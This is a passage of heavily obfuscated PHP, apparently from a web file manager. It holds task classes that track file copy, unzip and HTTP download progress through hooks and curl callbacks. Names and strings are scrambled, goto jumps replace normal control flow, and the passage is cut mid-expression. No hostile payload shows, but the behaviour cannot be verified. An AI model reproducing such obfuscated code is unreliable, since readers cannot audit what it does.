(!class_exists($bµ…²ïÒ¢)) { return actionCallError("\133{$Dçó£ ‰º}\x20\x3d\76\x20{$bµ…²ïÒ¢}\x5d\x20\x63\x6c\x61\163\x73\40\x6e\157\x74\40\145\170\x69\x73\164\x73\41"); } goto cæŒ³©•¢ƒ; Fö†ÄÕÄ­‘: $E½­‹­ ÑÇ = strtolower($dÁ»È‘Ù–[0]); if (substr($E½­‹­ ÑÇ, -6) == $C”î’¹«“[6]) { $Dçó£ ‰º = substr($dÁ»È‘Ù–[0], 0, -6); $bµ…²ïÒ¢ = $Dçó£ ‰º . $C”î’¹«“[7]; $EÚÙ‹ßÌ’¬ = $C”î’¹«“[8]; if (isset($dÁ»È‘Ù–[1]) && substr(strtolower($dÁ»È‘Ù–[1]), -5) == $C”î’¹«“[9]) { $bµ…²ïÒ¢ = $Dçó£ ‰º . $dÁ»È‘Ù–[1]; $EÚÙ‹ßÌ’¬ = $C”î’¹«“[10] . $dÁ»È‘Ù–[1] . $C”î’¹«“[11]; } else { if (count($dÁ»È‘Ù–) == 3) { $bµ…²ïÒ¢ = $Dçó£ ‰º . $dÁ»È‘Ù–[1] . $dÁ»È‘Ù–[2]; $EÚÙ‹ßÌ’¬ = $C”î’¹«“[12] . $dÁ»È‘Ù–[1] . $C”î’¹«“[13] . $dÁ»È‘Ù–[2] . $C”î’¹«“[11]; } } $EÚÙ‹ßÌ’¬ = PLUGIN_DIR . $Dçó£ ‰º . $C”î’¹«“[4] . $EÚÙ‹ßÌ’¬; } else { if (substr($E½­‹­ ÑÇ, -5) == $C”î’¹«“[9]) { $Dçó£ ‰º = substr($dÁ»È‘Ù–[0], 0, -5); return Model($Dçó£ ‰º); } else { $bµ…²ïÒ¢ = $dÁ»È‘Ù–[0] . $dÁ»È‘Ù–[1]; $EÚÙ‹ßÌ’¬ = CONTROLLER_DIR . $dÁ»È‘Ù–[0] . $C”î’¹«“[4] . $dÁ»È‘Ù–[1] . $C”î’¹«“[14]; } } $Aš–÷ÅÆ¬« = strtolower($bµ…²ïÒ¢); goto AÆŠßÕ‡Éà; b¼É¸ğ÷š: if (isset($d‰îÛî¤ƒÃ[$F›š‘‡–Û©])) { return $d‰îÛî¤ƒÃ[$F›š‘‡–Û©]; } $Dçó£ ‰º = trim(str_replace($C”î’¹«“[4], $C”î’¹«“[5], $Dçó£ ‰º), $C”î’¹«“[4]); $dÁ»È‘Ù– = explode($C”î’¹«“[5], $Dçó£ ‰º); goto Fö†ÄÕÄ­‘; Bó²ÀòÚÏß: $C”î’¹«“ =& $_SERVER[ˆó©™¯í›]; static $d‰îÛî¤ƒÃ = array(); $F›š‘‡–Û© = $Dçó£ ‰º; goto b¼É¸ğ÷š; cæŒ³©•¢ƒ: $d‰îÛî¤ƒÃ[$Aš–÷ÅÆ¬«] = new $bµ…²ïÒ¢(); $d‰îÛî¤ƒÃ[$F›š‘‡–Û©] = $d‰îÛî¤ƒÃ[$Aš–÷ÅÆ¬«]; return $d‰îÛî¤ƒÃ[$Aš–÷ÅÆ¬«]; goto aòÂÅÃÔ½Ê; aòÂÅÃÔ½Ê: } function ActionApply($AîùÇìÛù, $DÛîØŠâÒœ = array()) { goto Eî…È¤ÊëÇ; f²èèÖ®¼¤: if (!is_object($CŠºÉÊÊ‰Ù) || !method_exists($CŠºÉÊÊ‰Ù, $F­£•´çù«)) { return actionCallError("{$AîùÇìÛù}\x20\x6d\145\164\150\157\x64\x20\156\x6f\164\x20\145\170\151\163\x74\x73\41"); } $Aùâ°ƒ°ÊÜ = call_user_func_array(array($CŠºÉÊÊ‰Ù, $F­£•´çù«), $DÛîØŠâÒœ); return $Aùâ°ƒ°ÊÜ; goto b˜ØŠ”±ë£; A˜§Ôá¢½: $Aá…£¹ÓîŠ = substr($AîùÇìÛù, 0, $bë¸øÚ—Ñ); $F­£•´çù« = substr($AîùÇìÛù, $bë¸øÚ—Ñ + 1); $CŠºÉÊÊ‰Ù = Action($Aá…£¹ÓîŠ); goto f²èèÖ®¼¤; Eî…È¤ÊëÇ: if (is_array($AîùÇìÛù)) { return call_user_func_array($AîùÇìÛù, $DÛîØŠâÒœ); } if (function_exists($AîùÇìÛù)) { return call_user_func_array($AîùÇìÛù, $DÛîØŠâÒœ); } $bë¸øÚ—Ñ = strrpos($AîùÇìÛù, $_SERVER[ˆó©™¯í›][5]); goto A˜§Ôá¢½; b˜ØŠ”±ë£: } function actionCallError($eÑ¶‰‰‡) { return write_log($eÑ¶‰‰‡, $_SERVER[ˆó©™¯í›][15]); } goto c±¹àœã¸†; f±çÀÆÛ½Ì: class TaskFileTransfer extends Task { protected function startAfter() { goto e—÷»³‰©; e—÷»³‰©: $D–Ê¬µ‹· =& $_SERVER[ã®Â„Éæ¹¤]; $a¿åğÂä»ä =& $this->task; $this->sourceCopyFolder = !1; goto CÔ‘º†Š¢š; C“©Œ¼ÌÜ‘: $a¿åğÂä»ä[$D–Ê¬µ‹·[1499]] = LNG($D–Ê¬µ‹·[1500]); $a¿åğÂä»ä[$D–Ê¬µ‹·[1501]] = 0; $a¿åğÂä»ä[$D–Ê¬µ‹·[1502]] = 0; goto EÆ¶Ÿ åªŸ; CÔ‘º†Š¢š: Hook::bind($D–Ê¬µ‹·[1480], array($this, $D–Ê¬µ‹·[1481])); Hook::bind($D–Ê¬µ‹·[1482], array($this, $D–Ê¬µ‹·[1483])); Hook::bind($D–Ê¬µ‹·[1484], array($this, $D–Ê¬µ‹·[1485])); goto E¿çÍÚÓÅ; EÆ¶Ÿ åªŸ: $a¿åğÂä»ä[$D–Ê¬µ‹·[997]] = $D–Ê¬µ‹·[33]; $a¿åğÂä»ä[$D–Ê¬µ‹·[1503]] = $D–Ê¬µ‹·[33]; $a¿åğÂä»ä[$D–Ê¬µ‹·[1504]] = 0; goto cœèº´«°ø; d¥‘ŠÊ¬‰î: Hook::bind($D–Ê¬µ‹·[513], array($this, $D–Ê¬µ‹·[1489])); Hook::bind($D–Ê¬µ‹·[515], array($this, $D–Ê¬µ‹·[1489])); Hook::bind($D–Ê¬µ‹·[517], array($this, $D–Ê¬µ‹·[1489])); goto D ¥ÍÄšê±; fë†Çİ‡‡ì: Hook::bind($D–Ê¬µ‹·[1493], array($this, $D–Ê¬µ‹·[1494])); Hook::bind($D–Ê¬µ‹·[1495], array($this, $D–Ê¬µ‹·[1496])); Hook::bind($D–Ê¬µ‹·[1497], array($this, $D–Ê¬µ‹·[1498])); goto C“©Œ¼ÌÜ‘; cœèº´«°ø: $a¿åğÂä»ä[$D–Ê¬µ‹·[1505]] = 0; $a¿åğÂä»ä[$D–Ê¬µ‹·[1506]] = 0; if (!$a¿åğÂä»ä[$D–Ê¬µ‹·[1362]]) { $a¿åğÂä»ä[$D–Ê¬µ‹·[1362]] = LNG($D–Ê¬µ‹·[1507]); } goto b“ëéîª­ë; E¿çÍÚÓÅ: Hook::bind($D–Ê¬µ‹·[540], array($this, $D–Ê¬µ‹·[1486])); Hook::bind($D–Ê¬µ‹·[541], array($this, $D–Ê¬µ‹·[1487])); Hook::bind($D–Ê¬µ‹·[543], array($this, $D–Ê¬µ‹·[1488])); goto C‡Á•´²İ; D ¥ÍÄšê±: Hook::bind($D–Ê¬µ‹·[1490], array($this, $D–Ê¬µ‹·[1491])); Hook::bind($D–Ê¬µ‹·[533], array($this, $D–Ê¬µ‹·[1492])); $this->sourceModelCopyFlag = !1; goto fë†Çİ‡‡ì; C‡Á•´²İ: Hook::bind($D–Ê¬µ‹·[544], array($this, $D–Ê¬µ‹·[1488])); Hook::bind($D–Ê¬µ‹·[511], array($this, $D–Ê¬µ‹·[1489])); Hook::bind($D–Ê¬µ‹·[508], array($this, $D–Ê¬µ‹·[1489])); goto d¥‘ŠÊ¬‰î; b“ëéîª­ë: } protected function endAfter() { goto fìêå‘É¬ƒ; fìêå‘É¬ƒ: $CÌÊÍäŸ‘µ =& $_SERVER[ã®Â„Éæ¹¤]; Hook::unbind($CÌÊÍäŸ‘µ[1480], array($this, $CÌÊÍäŸ‘µ[1481])); Hook::unbind($CÌÊÍäŸ‘µ[1482], array($this, $CÌÊÍäŸ‘µ[1483])); goto b”¥ã²£·Ÿ; e”íë¢¢§: Hook::unbind($CÌÊÍäŸ‘µ[1493], array($this, $CÌÊÍäŸ‘µ[1494])); Hook::unbind($CÌÊÍäŸ‘µ[1495], array($this, $CÌÊÍäŸ‘µ[1496])); Hook::unbind($CÌÊÍäŸ‘µ[1497], array($this, $CÌÊÍäŸ‘µ[1498])); goto C÷®óÛ¥Æ; fÏø˜¡‡â: Hook::unbind($CÌÊÍäŸ‘µ[543], array($this, $CÌÊÍäŸ‘µ[1488])); Hook::unbind($CÌÊÍäŸ‘µ[544], array($this, $CÌÊÍäŸ‘µ[1488])); Hook::unbind($CÌÊÍäŸ‘µ[511], array($this, $CÌÊÍäŸ‘µ[1489])); goto B£†Ê¦§Ó; A»É¶’°…: Hook::unbind($CÌÊÍäŸ‘µ[517], array($this, $CÌÊÍäŸ‘µ[1489])); Hook::unbind($CÌÊÍäŸ‘µ[1490], array($this, $CÌÊÍäŸ‘µ[1491])); Hook::unbind($CÌÊÍäŸ‘µ[533], array($this, $CÌÊÍäŸ‘µ[1492])); goto e”íë¢¢§; B£†Ê¦§Ó: Hook::unbind($CÌÊÍäŸ‘µ[508], array($this, $CÌÊÍäŸ‘µ[1489])); Hook::unbind($CÌÊÍäŸ‘µ[513], array($this, $CÌÊÍäŸ‘µ[1489])); Hook::unbind($CÌÊÍäŸ‘µ[515], array($this, $CÌÊÍäŸ‘µ[1489])); goto A»É¶’°…; b”¥ã²£·Ÿ: Hook::unbind($CÌÊÍäŸ‘µ[1484], array($this, $CÌÊÍäŸ‘µ[1485])); Hook::unbind($CÌÊÍäŸ‘µ[540], array($this, $CÌÊÍäŸ‘µ[1486])); Hook::unbind($CÌÊÍäŸ‘µ[541], array($this, $CÌÊÍäŸ‘µ[1487])); goto fÏø˜¡‡â; C÷®óÛ¥Æ: } public function copyMoveStart($fÎãÖèô, $C«¾´²áŞ´, $D¸êŒÔ•”Ÿ, $d¶Ìæ°äÃ¥) { goto cà†õ•‚ñÑ; B¢ïŸªåß¾: $F†›ù–¾Ö[$Aô„ŠÒÃ“†[1509]] = KodIO::transferType($fÎãÖèô, $D¸êŒÔ•”Ÿ); $this->update(); goto EÄñÖ¼ÛÍ; eÆäÅØÂ: if (substr($C«¾´²áŞ´, 0, strlen($BœÙï˜¥‰‘)) == $BœÙï˜¥‰‘) { return; } if (substr($d¶Ìæ°äÃ¥, 0, strlen($BœÙï˜¥‰‘)) == $BœÙï˜¥‰‘) { return; } $F†›ù–¾Ö =& $this->task; goto B¢ïŸªåß¾; cà†õ•‚ñÑ: $Aô„ŠÒÃ“† =& $_SERVER[ã®Â„Éæ¹¤]; self::log($Aô„ŠÒÃ“†[1508] . $C«¾´²áŞ´ . $Aô„ŠÒÃ“†[66] . $d¶Ìæ°äÃ¥); $BœÙï˜¥‰‘ = rtrim(TEMP_FILES, $Aô„ŠÒÃ“†[8]); goto eÆäÅØÂ; EÄñÖ¼ÛÍ: } public function updateAfter() { goto bĞ›ÊÔœ¬Í; f‹ê•î˜ÒÒ: if ($this->sourceModelCopyFlag) { return; } if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1509]] == $A’ãäÅĞŒ×[1113]) { return; } if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1509]] == $A’ãäÅĞŒ×[1059] || $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1509]] == $A’ãäÅĞŒ×[103]) { if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1503]]) { $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1506]] = $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1505]] + $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1502]]; } } else { if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1509]] == $A’ãäÅĞŒ×[1114]) { if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1503]] == $A’ãäÅĞŒ×[1059]) { $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1506]] = $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1505]] + $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1502]] * 0.5; } else { if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1503]] == $A’ãäÅĞŒ×[103]) { $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1506]] = $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1505]] + $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1501]] * 0.5 + $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1502]] * 0.5; } } } } goto a¸»¨Š—ç©; a¸»¨Š—ç©: $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1457]] = $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1506]] / $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[720]]; if ($eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1457]] > 0) { $E™‰¿•¬‡Í = timeFloat() - $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1459]] - $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1462]]; $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1463]] = $E™‰¿•¬‡Í * (1 - $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1457]]) / $eÛ´–Ş…Èó[$A’ãäÅĞŒ×[1457]]; } goto e¬²Äùšˆé; bĞ›ÊÔœ¬Í: $A’ãäÅĞŒ× =& $_SERVER[ã®Â„Éæ¹¤]; $eÛ´–Ş…Èó =& $this->task; if (!$eÛ´–Ş…Èó[$A’ãäÅĞŒ×[720]]) { return; } goto f‹ê•î˜ÒÒ; e¬²Äùšˆé: } public function addPath($b‚¬í©ØÂ£) { goto dŒ±Æ§ùÚ; DˆèÈŒà„ù: $AÁ±…Í™İ = IO::infoWithChildren($b‚¬í©ØÂ£); $eÑçø¯ğ¤„ = $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[1510]] ? $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[1510]][$däĞ¤…ËÃ¼[1511]] : 0; $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[1510]] = array($däĞ¤…ËÃ¼[1511] => $eÑçø¯ğ¤„ + 1, $däĞ¤…ËÃ¼[386] => $AÁ±…Í™İ[$däĞ¤…ËÃ¼[28]], $däĞ¤…ËÃ¼[75] => $AÁ±…Í™İ[$däĞ¤…ËÃ¼[75]], $däĞ¤…ËÃ¼[468] => $AÁ±…Í™İ[$däĞ¤…ËÃ¼[468]] ? $AÁ±…Í™İ[$däĞ¤…ËÃ¼[468]] : $AÁ±…Í™İ[$däĞ¤…ËÃ¼[75]]); goto c¬Ó‚ÂáÑÜ; dŒ±Æ§ùÚ: $däĞ¤…ËÃ¼ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$b‚¬í©ØÂ£) { return; } $cØ‘¸ğì¯Ù =& $this->task; goto DˆèÈŒà„ù; c¬Ó‚ÂáÑÜ: if ($AÁ±…Í™İ[$däĞ¤…ËÃ¼[29]] == $däĞ¤…ËÃ¼[167]) { $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[995]] += 1; } else { $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[995]] += $AÁ±…Í™İ[$däĞ¤…ËÃ¼[80]][$däĞ¤…ËÃ¼[78]]; if ($AÁ±…Í™İ[$däĞ¤…ËÃ¼[369]]) { $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[995]] += $AÁ±…Í™İ[$däĞ¤…ËÃ¼[80]][$däĞ¤…ËÃ¼[79]] + 1; } } $cØ‘¸ğì¯Ù[$däĞ¤…ËÃ¼[720]] += $AÁ±…Í™İ[$däĞ¤…ËÃ¼[77]]; $this->update(); goto BòÌ¹Ç³Ñµ; BòÌ¹Ç³Ñµ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($D´–£š´) { $Fëİ‰‚Üİ =& $_SERVER[ã®Â„Éæ¹¤]; $AïÎïóóà =& $this->task; $AïÎïóóà[$Fëİ‰‚Üİ[1499]] = $D´–£š´[$Fëİ‰‚Üİ[28]]; $AïÎïóóà[$Fëİ‰‚Üİ[997]] = $D´–£š´[$Fëİ‰‚Üİ[28]]; $this->update(); } public function copyFileStart($fÜğÛ…ù»¡, $BÇ’‡°öÕ¡, $f®êÜµâÏÁ, $Dâ©íî–´, $FŒÈœÖ’ª, $F÷´×™§·²) { goto D½…ã„áñç; dºàïì¬æ: $this->update(); goto Aö­†±½®; aÁá›©…Óô: $F„òªÀ§›[$f¡ÄÆ—«‹[1499]] = $Bğ‚»ßÜ; $F„òªÀ§›[$f¡ÄÆ—«‹[1501]] = (int) $fÜğÛ…ù»¡->size($BÇ’‡°öÕ¡); $F„òªÀ§›[$f¡ÄÆ—«‹[1502]] = 0; goto bé™®÷„£Œ; bé™®÷„£Œ: $F„òªÀ§›[$f¡ÄÆ—«‹[997]] = $f¡ÄÆ—«‹[33]; $F„òªÀ§›[$f¡ÄÆ—«‹[1503]] = $f¡ÄÆ—«‹[33]; $F„òªÀ§›[$f¡ÄÆ—«‹[1504]] = 0; goto dºàïì¬æ; D½…ã„áñç: $f¡ÄÆ—«‹ =& $_SERVER[ã®Â„Éæ¹¤]; $Bğ‚»ßÜ = $FŒÈœÖ’ª; if ($Bğ‚»ßÜ == $GLOBALS[$f¡ÄÆ—«‹[1512]]) { $Bğ‚»ßÜ = $GLOBALS[$f¡ÄÆ—«‹[1513]]; } goto fÅÙ³õôİº; fÅÙ³õôİº: $GLOBALS[$f¡ÄÆ—«‹[1513]] = $FŒÈœÖ’ª; $GLOBALS[$f¡ÄÆ—«‹[1512]] = $F÷´×™§·²; $F„òªÀ§› =& $this->task; goto aÁá›©…Óô; Aö­†±½®: } public function copyFileEnd($eñ¤‘ÒØê, $a‚ãÊ„‚ó, $c…¨¼‡ˆ±å, $b§Ú¯ˆ·ö, $A…§È¼¡¼–, $Eó‚êÑ˜®®) { $BóŸ¹†¤Ì =& $_SERVER[ã®Â„Éæ¹¤]; $Bóã†–ğ— =& $this->task; $Bóã†–ğ—[$BóŸ¹†¤Ì[1502]] = $Bóã†–ğ—[$BóŸ¹†¤Ì[1501]]; $Bóã†–ğ—[$BóŸ¹†¤Ì[1503]] = $BóŸ¹†¤Ì[33]; if ($A…§È¼¡¼– == $Bóã†–ğ—[$BóŸ¹†¤Ì[1499]]) { $Bóã†–ğ—[$BóŸ¹†¤Ì[1505]] += $Bóã†–ğ—[$BóŸ¹†¤Ì[1501]]; $Bóã†–ğ—[$BóŸ¹†¤Ì[1506]] = $Bóã†–ğ—[$BóŸ¹†¤Ì[1505]]; $this->update(1); } else { $this->update(); $Bóã†–ğ—[$BóŸ¹†¤Ì[1502]] = 0; } self::log($BóŸ¹†¤Ì[1514] . $a‚ãÊ„‚ó . $BóŸ¹†¤Ì[66] . $b§Ú¯ˆ·ö . $BóŸ¹†¤Ì[217] . $A…§È¼¡¼– . $BóŸ¹†¤Ì[1515] . $Bóã†–ğ—[$BóŸ¹†¤Ì[1499]]); } public function updateFileEnd($F†¢ã³ÊŞ, $b¶œÖëƒ) { goto Eïº‹Šù‡İ; cÊ¶Û­àá©: $C‰Ù¥¶‹•´[$BÅ¬ĞŞ¥Œ¨[1501]] = $b¶œÖëƒ; $C‰Ù¥¶‹•´[$BÅ¬ĞŞ¥Œ¨[1505]] += $b¶œÖëƒ; $C‰Ù¥¶‹•´[$BÅ¬ĞŞ¥Œ¨[1506]] = $C‰Ù¥¶‹•´[$BÅ¬ĞŞ¥Œ¨[1505]]; goto E¨Ş‘Ä; Eïº‹Šù‡İ: $BÅ¬ĞŞ¥Œ¨ =& $_SERVER[ã®Â„Éæ¹¤]; $C‰Ù¥¶‹•´ =& $this->task; $C‰Ù¥¶‹•´[$BÅ¬ĞŞ¥Œ¨[1499]] = $F†¢ã³ÊŞ; goto cÊ¶Û­àá©; E¨Ş‘Ä: $this->update(1); self::log($BÅ¬ĞŞ¥Œ¨[1516] . $F†¢ã³ÊŞ); goto F£¾‹¸Õ Ü; F£¾‹¸Õ Ü: } public function sourceModelCopy($dë¹¡öƒòĞ) { goto bó•Á“äŞÖ; f°µ ŞŸô: $C±¦¥”¸Ó— =& $this->task; $this->sourceModelCopyFlag = !0; $d…„æõäœÊ = 0; goto eƒåâˆ¢Ì; bó•Á“äŞÖ: $eÄ ×Àò¦ =& $_SERVER[ã®Â„Éæ¹¤]; $dáÜæÈË = $dë¹¡öƒòĞ[0]; $aÏ»øˆï² = $dë¹¡öƒòĞ[1]; goto f°µ ŞŸô; eƒåâˆ¢Ì: switch ($dáÜæÈË) { case $eÄ ×Àò¦[509]: $d…„æõäœÊ = 1; break; case $eÄ ×Àò¦[512]: $C±¦¥”¸Ó—[$eÄ ×Àò¦[1499]] = $aÏ»øˆï²[$eÄ ×Àò¦[28]]; break; case $eÄ ×Àò¦[514]: $d…„æõäœÊ = intval($dë¹¡öƒòĞ[$eÄ ×Àò¦[363]] * 0.4); break; case $eÄ ×Àò¦[516]: $d…„æõäœÊ = intval($dë¹¡öƒòĞ[$eÄ ×Àò¦[363]] * 0.2); break; case $eÄ ×Àò¦[518]: $d…„æõäœÊ = intval($dë¹¡öƒòĞ[$eÄ ×Àò¦[363]] * 0.4); break; } $this->update($d…„æõäœÊ); $this->sourceModelCopyFlag = !1; goto FùÜø¾Òƒ ; FùÜø¾Òƒ : } public function sourceRemove($CÓ½Ë¶¶Œ‡, $C½Ø¼ãäÔ) { $D§ñ‡¥áÉŒ =& $_SERVER[ã®Â„Éæ¹¤]; $this->sourceModelCopyFlag = !0; $dó¨´ÍÙæŸ = 1; if (isset($CÓ½Ë¶¶Œ‡[$D§ñ‡¥áÉŒ[80]])) { $dó¨´ÍÙæŸ = $CÓ½Ë¶¶Œ‡[$D§ñ‡¥áÉŒ[80]][$D§ñ‡¥áÉŒ[78]] + $CÓ½Ë¶¶Œ‡[$D§ñ‡¥áÉŒ[80]][$D§ñ‡¥áÉŒ[79]] + 1; } $this->update($dó¨´ÍÙæŸ); $this->sourceModelCopyFlag = !1; } public function sourceMove($b‚ƒƒšñØÅ) { $this->sourceRemove($b‚ƒƒšñØÅ, !1); } public function curlProgress($eÕÜä‡ŸŠ, $càÁ‡êÑ®¼, $dèŒğº”¸¦, $Cî…Ìá½á®, $F´ Ö¦ÔÒ†) { $DÚ“ŠîªëÅ =& $_SERVER[ã®Â„Éæ¹¤]; $e¶†´ÏŠ× =& $this->task; if ($F´ Ö¦ÔÒ† > 0) { $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[997]] = $DÚ“ŠîªëÅ[1517]; $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1503]] = $DÚ“ŠîªëÅ[103]; if ($e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1501]] == $Cî…Ìá½á® || $Cî…Ìá½á® > 1024 * 1024) { $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1502]] = $F´ Ö¦ÔÒ†; } if ($e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1504]]) { $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1502]] = $F´ Ö¦ÔÒ† + $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1504]]; } } else { if ($dèŒğº”¸¦ > 0) { if ($e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1501]] == $càÁ‡êÑ®¼) { $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1502]] = $dèŒğº”¸¦; $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[997]] = $DÚ“ŠîªëÅ[1518]; $e¶†´ÏŠ×[$DÚ“ŠîªëÅ[1503]] = $DÚ“ŠîªëÅ[1059]; } } } $this->update(); } public function curlProgressStart($cĞŒ¶¼÷İÆ) { } public function curlProgressEnd($EÒøã‰ä’Ø) { $F†Ï–ÈäÎç =& $_SERVER[ã®Â„Éæ¹¤]; $BœƒéÃ§¬Æ =& $this->task; $DŸ›ì¼ï¢Ç = curl_getinfo($EÒøã‰ä’Ø); $f¯¹„¢ã½ = $DŸ›ì¼ï¢Ç[$F†Ï–ÈäÎç[1519]]; if ($BœƒéÃ§¬Æ[$F†Ï–ÈäÎç[1503]] == $F†Ï–ÈäÎç[103] && $f¯¹„¢ã½) { $BœƒéÃ§¬Æ[$F†Ï–ÈäÎç[1504]] += $f¯¹„¢ã½; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $d”ñï‹‘»î =& $_SERVER[ã®Â„Éæ¹¤]; $c¯”“‘›Ë÷ =& $this->task; $c¯”“‘›Ë÷[$d”ñï‹‘»î[1520]] = 1; Hook::bind($d”ñï‹‘»î[1493], array($this, $d”ñï‹‘»î[1521])); Hook::bind($d”ñï‹‘»î[1495], array($this, $d”ñï‹‘»î[1522])); Hook::bind($d”ñï‹‘»î[1497], array($this, $d”ñï‹‘»î[1523])); } protected function endAfter() { $B’Å¢…×Àá =& $_SERVER[ã®Â„Éæ¹¤]; Hook::unbind($B’Å¢…×Àá[1493], array($this, $B’Å¢…×Àá[1521])); Hook::unbind($B’Å¢…×Àá[1495], array($this, $B’Å¢…×Àá[1522])); Hook::unbind($B’Å¢…×Àá[1497], array($this, $B’Å¢…×Àá[1523])); } public function progressStart($d‡“ò²Œº) { $eâˆğ‰‹ó =& $_SERVER[ã®Â„Éæ¹¤]; $b˜ùÃ›ƒ÷¼ = curl_getinfo($d‡“ò²Œº); self::log($eâˆğ‰‹ó[1524] . $b˜ùÃ›ƒ÷¼[$eâˆğ‰‹ó[295]]); self::valueSet($this->task[$eâˆğ‰‹ó[367]], $this->task); } public function progressEnd($aä´…è’ˆé) { $Aé–¥¯Ô½‰ =& $_SERVER[ã®Â„Éæ¹¤]; self::log($Aé–¥¯Ô½‰[1525] . $this->task[$Aé–¥¯Ô½‰[367]]); $this->end(); } public function progress($eİ²ŸâòéŒ, $d‚İÒ½¼ƒâ, $E£ª ÙëÊ, $BÕ†à’ğ¥, $f½µ“Š“ÀŠ) { $CùÖÏ÷ÜÈ =& $_SERVER[ã®Â„Éæ¹¤]; $b’†›¾’° =& $this->task; if ($f½µ“Š“ÀŠ > 0) { $b’†›¾’°[$CùÖÏ÷ÜÈ[995]] = $b’†›¾’°[$CùÖÏ÷ÜÈ[995]] == 0 ? $BÕ†à’ğ¥ : $b’†›¾’°[$CùÖÏ÷ÜÈ[995]]; $b’†›¾’°[$CùÖÏ÷ÜÈ[1009]] = $f½µ“Š“ÀŠ; } else { if ($E£ª ÙëÊ > 0) { $b’†›¾’°[$CùÖÏ÷ÜÈ[995]] = $b’†›¾’°[$CùÖÏ÷ÜÈ[995]] == 0 ? $d‚İÒ½¼ƒâ : $b’†›¾’°[$CùÖÏ÷ÜÈ[995]]; $b’†›¾’°[$CùÖÏ÷ÜÈ[1009]] = $E£ª ÙëÊ; } } $this->update(); self::log("\x70\x72\157\147\x72\x65\x73\163\110\x74\x74\160\72\x64\157\x77\x6e\72{$E£ª ÙëÊ}\x2f{$d‚İÒ½¼ƒâ}\73\x20\165\160\x6c\x6f\141\144\72{$f½µ“Š“ÀŠ}\57{$BÕ†à’ğ¥}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto A¼ßøãæÌ; c‡©·Šôö: Hook::bind($Cî‚ÍŠ‰©[1054], array($this, $Cî‚ÍŠ‰©[1528])); $Bˆ­Ø´ÉÂ´ =& $this->task; $Bˆ­Ø´ÉÂ´[$Cî‚ÍŠ‰©[1529]] = $Cî‚ÍŠ‰©[1059]; goto B‘‘Œ¶Û¿; A¼ßøãæÌ: $Cî‚ÍŠ‰© =& $_SERVER[ã®Â„Éæ¹¤]; parent::startAfter(); Hook::bind($Cî‚ÍŠ‰©[1526], array($this, $Cî‚ÍŠ‰©[1527])); goto c‡©·Šôö; B‘‘Œ¶Û¿: if (!$Bˆ­Ø´ÉÂ´[$Cî‚ÍŠ‰©[1362]]) { $Bˆ­Ø´ÉÂ´[$Cî‚ÍŠ‰©[1362]] = LNG($Cî‚ÍŠ‰©[1530]); } goto Cáå±à­¶–; Cáå±à­¶–: } protected function endAfter() { $dà¤½ßŒÜÙ =& $_SERVER[ã®Â„Éæ¹¤]; parent::endAfter(); Hook::unbind($dà¤½ßŒÜÙ[1526], array($this, $dà¤½ßŒÜÙ[1527])); Hook::unbind($dà¤½ßŒÜÙ[1054], array($this, $dà¤½ßŒÜÙ[1528])); } public function updateAfter() { $Bê†Ä®ğšÄ =& $_SERVER[ã®Â„Éæ¹¤]; $dŸ·Ò¶ÂÊ• =& $this->task; if (!$dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[995]] || !$dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[720]]) { return; } if ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1529]] == $Bê†Ä®ğšÄ[1059]) { $Fåøƒğƒ‘ = 0; if ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1501]]) { $Fåøƒğƒ‘ = $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1502]] / $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1501]]; } $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1457]] = $Fåøƒğƒ‘ * 0.3; } else { if ($dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1529]] == $Bê†Ä®ğšÄ[301]) { $Fåøƒğƒ‘ = $dŸ·Ò¶ÂÊ•[$Bê†Ä®ğšÄ[1009]] 